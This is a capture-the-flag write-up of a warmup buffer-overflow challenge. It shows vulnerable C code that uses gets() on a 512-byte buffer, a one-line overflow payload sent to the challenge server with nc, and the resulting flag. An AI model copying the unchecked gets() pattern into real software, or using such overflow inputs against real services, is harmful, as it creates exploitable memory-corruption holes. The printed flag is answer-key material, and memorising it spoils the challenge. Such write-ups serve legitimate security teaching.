# Butter Overflow
easy | warmups | 50 points  

>Can you overflow this right?

This is a very simple buffer overflow challenge. There are three files:
- a makefile
- the source code 
- the resulting executable file

We were also given an server that we could connect to using `nc`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>

void give_flag();

void handler(int sig) {
    if (sig == SIGSEGV)
        give_flag();
}

void give_flag() {
    char *flag = NULL;
    FILE *fp = NULL;
    struct stat sbuf;

    if ((fp = fopen("flag.txt", "r")) == NULL) {
        puts("Could not open flag file.");
        exit(EXIT_FAILURE);
    }

    fstat(fileno(fp), &sbuf);

    flag = malloc(sbuf.st_size + 1);
    if (flag == NULL) {
        puts("Failed to allocate memory for the flag.");
        exit(EXIT_FAILURE);
    }

    fread(flag, sizeof(char), sbuf.st_size, fp);
    flag[sbuf.st_size] = '\0';

    puts(flag);

    fclose(fp);
    free(flag);

    exit(EXIT_SUCCESS);
}

int main() {
    char buffer[0x200];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    signal(SIGSEGV, handler);

    puts("How many bytes does it take to overflow this buffer?");
    gets(buffer);

    return 0;
}
```

The source code shows the buffer is 512 chars long (I initially didn't see the `0x` before the 200 and thought it was 200 chars long), and the flag is printed when a segmentation fault takes place (`SIGSEGV`), denoted by the `handler()` function.

As I initially saw the buffer as 200 chars, I tried sending inputs with more than 200 chars, and that clearly did not work.

After sometime, I sent an input with a very high character length after looking up some resources. It caused a segmentation fault!

```
$ python -c 'print "A"*1200' > file
$ chmod +x butter_overflow
$ cat file | ./butter_overflow
How many bytes does it take to overflow this buffer?
Could not open flag file.
```

The flag file did not open as there is no flag file on my machine. Since the input worked locally, I sent the same input to the server for this challenge, and received the flag!

```
$ cat file | nc challenge.ctf.games 30054
How many bytes does it take to overflow this buffer?
flag{72d8784a5da3a8f56d2106c12dbab989}
```

Flag: `flag{72d8784a5da3a8f56d2106c12dbab989}`